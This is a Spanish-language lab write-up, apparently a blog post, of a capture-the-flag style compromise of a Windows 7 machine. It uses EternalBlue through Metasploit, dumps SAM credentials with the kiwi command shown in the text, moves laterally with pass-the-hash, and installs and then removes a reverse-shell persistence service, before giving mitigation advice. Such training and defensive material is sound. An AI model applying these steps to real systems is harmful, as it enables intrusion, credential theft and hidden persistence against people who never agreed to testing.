<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Sistema Operativo</th>
          <th style="text-align: left">Dirección IP</th>
          <th style="text-align: left">Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Windows 7 x64 SP 1</td>
          <td style="text-align: left">192.168.1.167</td>
          <td style="text-align: left">135, 139, 445, 49152-49158</td>
      </tr>
  </tbody>
</table>
<h3 id="verificación-de-vulnerabilidad">Verificación de vulnerabilidad</h3>
<p>El servicio SMB ejecutándose en el puerto 445 en una máquina Windows 7 indica una potencial vulnerabilidad al exploit EternalBlue. Un escaneo adicional con un script de nmap reveló que el sistema era efectivamente vulnerable a CVE-2017-0144 (EternalBlue).</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image2.png" alt="confirmación de nmap" />
</div>
<center><em>Figura 2:</em> Confirmación de vulnerabilidad EternalBlue</center>
<h2 id="explotación">Explotación</h2>
<p>Para explotar la vulnerabilidad se utilizó el framework Metasploit. Se seleccionó y configuró el módulo EternalBlue.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image3.png" alt="configuración de exploit" />
</div>
<center><em>Figura 3:</em> Configuración del exploit</center>
<p>Se configuró un payload de tipo reverse shell, lo que permitió obtener una conexión remota con control total del sistema. El exploit proporcionó privilegios SYSTEM, por lo que no fue necesaria una elevación adicional.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image4.png" alt="ejecución de exploit" />
</div>
<center><em>Figura 4:</em> Resultado de la ejecución del exploit</center>
<h2 id="post-explotación">Post-Explotación</h2>
<p>Una vez establecida la sesión de meterpreter, se procedió a realizar actividades de post-explotación.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image5.png" alt="enumeración de usuarios" />
</div>
<center><em>Figura 5:</em> Enumeración de usuarios</center>
<h3 id="extracción-de-credenciales">Extracción de credenciales</h3>
<p>Se utilizó la herramienta Mimikatz mediante el módulo kiwi para extraer credenciales como contraseñas y hashes del sistema operativo Windows.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image6.png" alt="ejecución de mimikatz" />
</div>
<center><em>Figura 6:</em> Ejecución de Mimikatz</center>
<p>El archivo SAM (Security Account Manager) almacena los hashes de contraseñas de usuarios locales en un sistema Windows. Utilizando el comando <code>kiwi_cmd lsadump::sam</code> en meterpreter, se extrajo el archivo SAM que contiene los hashes NTLM de las contraseñas de los usuarios locales.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image7.png" alt="dump de hashes de usuarios locales" />
</div>
<center><em>Figura 7:</em> Dump de hashes de usuarios locales</center>
<h3 id="uso-de-credenciales-cifradas">Uso de credenciales cifradas</h3>
<p>Una vez obtenidos los hashes de contraseñas, se utilizó la técnica de Pass The Hash (PTH) para acceder a otros recursos del sistema sin necesidad de conocer las contraseñas en texto plano. Este método permite autenticarse y moverse lateralmente entre sistemas Windows, utilizando únicamente el hash de la contraseña.
Se utilizó la herramienta <code>crackmapexec</code> para autenticarse remotamente en otros sistemas o servicios de la red usando el hash de un usuario.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image8.png" alt="ejecución de crackmapexec" />
</div>
<center><em>Figura 8:</em> Ejecución de CrackMapExec</center>
<h3 id="persistencia">Persistencia</h3>
<p>A través de la persistencia, se puede mantener el acceso a un sistema comprometido incluso si este se reinicia, lo cual permite restablecer una conexión en el futuro sin tener que repetir el proceso inicial de explotación.
En este caso, se configuró un script de persistencia con el módulo <code>windows/local/persistence_service</code>, el cual genera y carga un ejecutable en el host remoto y luego lo convertirá en un servicio persistente.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image9.png" alt="ejecución de persistencia" />
</div>
<center><em>Figura 9:</em> Ejecución de servicio de persistencia.</center>
<p>Al ejecutar este módulo, meterpreter instala un servicio en el sistema comprometido que establece una conexión saliente de tipo reverse shell cada vez que se reinicia el sistema. Esto significa que, incluso si un atacante pierde la conexión inicial, este puede recuperar el acceso sin realizar de nuevo el exploit, siempre que el sistema esté encendido y el atacante esté escuchando en el puerto configurado.</p>
<h3 id="comprobación-de-persistencia">Comprobación de persistencia</h3>
<p>Para comprobar que la persistencia fue ejecutada correctamente, se cerraron las sesiones de meterpreter abiertas.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image10.png" alt="cierre de sesiones" />
</div>
<center><em>Figura 10:</em> Cierre de sesiones</center>
<p>Se creó un resource script para automatizar tareas repetitivas en Metasploit, facilitando la reconexión a la máquina comprometida con tan solo ejecutar el script.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image11.png" alt="resource script para metasploit" />
</div>
<center><em>Figura 11:</em> Resource script para Metasploit</center>
<p>Una vez ejecutado el script, se observa cómo se configura el payload y el módulo automáticamente para consecuentemente conectarse a la máquina, comprobando que la persistencia funciona correctamente.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image12.png" alt="ejecución del resource script" />
</div>
<center><em>Figura 12:</em> Ejecución del resource script</center>
<h3 id="limpieza-de-la-persistencia">Limpieza de la persistencia</h3>
<p>Para realizar la limpieza del sistema atacado, se cerró y eliminó el servicio creado llamado lsass1 mediante comandos <code>sc.exe</code>, lo que garantiza la eliminación del servicio de persistencia en el sistema. Además, se utilizó <code>taskkill.exe</code> para terminar a la fuerza el proceso asociado <code>sdvj.exe</code>, que estaba vinculado al payload de persistencia.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image13.png" alt="limpieza de persistencia" />
</div>
<center><em>Figura 13:</em> Limpieza de persistencia</center>
<p>Después de completar estos pasos, la sesión de Meterpreter se cerró de forma segura, lo que confirmó la finalización de la conexión. De esta manera se eliminaron todos los artefactos del mecanismo de persistencia, sin dejar puntos de acceso no autorizados en el sistema.</p>
<h2 id="banderas">Banderas</h2>
<p>Se procedió a realizar la búsqueda de las banderas con el comando <code>search</code> en meterpreter y se usó el comando <code>type</code> para mostrar su contenido.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image14.png" alt="ejecución de comando type" />
</div>
<center><em>Figura 14:</em> Ejecución del comando type</center>
<p>De esa manera se encontraron las dos banderas, las cuales son:</p>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Bandera</th>
          <th style="text-align: left">Hash</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">bandera1.txt</td>
          <td style="text-align: left">0ef3b7d488b11e3e800f547a0765da8e</td>
      </tr>
      <tr>
          <td style="text-align: left">bandera2.txt</td>
          <td style="text-align: left">a63c1c39c0c7fd570053343451667939</td>
      </tr>
  </tbody>
</table>
<h2 id="herramientas-utilizadas">Herramientas utilizadas</h2>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Herramienta</th>
          <th style="text-align: left">Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Nmap</td>
          <td style="text-align: left">Utilizado para el escaneo inicial del sistema y para identificar puertos y servicios abiertos en el objetivo.</td>
      </tr>
      <tr>
          <td style="text-align: left">Metasploit</td>
          <td style="text-align: left">Empleado para explotar la vulnerabilidad EternalBlue (CVE-2017-0144) con un payload de tipo reverse shell.</td>
      </tr>
      <tr>
          <td style="text-align: left">Mimikatz/kiwi</td>
          <td style="text-align: left">Usado dentro de Meterpreter para la extracción del hash de credenciales del sistema Windows.</td>
      </tr>
      <tr>
          <td style="text-align: left">CrackMapExec y PTH</td>
          <td style="text-align: left">Permitió movimiento lateral en la máquina sin necesidad de contraseñas en texto plano, usando solo hashes.</td>
      </tr>
      <tr>
          <td style="text-align: left">Persistencia con Metasploit</td>
          <td style="text-align: left">Configuración de persistencia mediante módulo windows/local/persistence_service para garantizar acceso continuo.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusión">Conclusión</h2>
<p>La vulnerabilidad EternalBlue explotada en la máquina Eternal muestra serios problemas de seguridad en su infraestructura, permitiendo a un atacante no autenticado obtener un control total del sistema. Una vez comprometido el sistema, se logró capturar credenciales, obtener acceso a recursos adicionales y configurar persistencia, demostrando así la facilidad con la que se pueden realizar movimientos laterales y mantener acceso prolongado sin detección.</p>
<h2 id="recomendaciones">Recomendaciones</h2>
<p>Para mitigar esta vulnerabilidad, se recomienda desactivar el protocolo SMBv1, para prevenir futuras explotaciones de tipo EternalBlue. En casos como este, es importante aislar los sistemas críticos en segmentos de red protegidos mediante VLANs y configuraciones robustas de firewall, además de restringir el tráfico SMB en el puerto 445 solo a lo necesario, monitorizando continuamente las conexiones sospechosas.</p>
<p>Para lograr una defensa a profundidad, se sugiere implementar soluciones IDS/IPS que detecten intentos de explotación y utilizar un SIEM para consolidar y analizar logs, facilitando así la detección temprana de amenazas.</p>
<p>Finalmente, se recomienda migrar de Windows 7 a una versión más actual, como Windows 10, para beneficiarse de mejoras de seguridad y soporte continuo, lo que reforzará la protección de la infraestructura.</p>
</div>
]]></content:encoded>
    </item>
  </channel>
</rss>
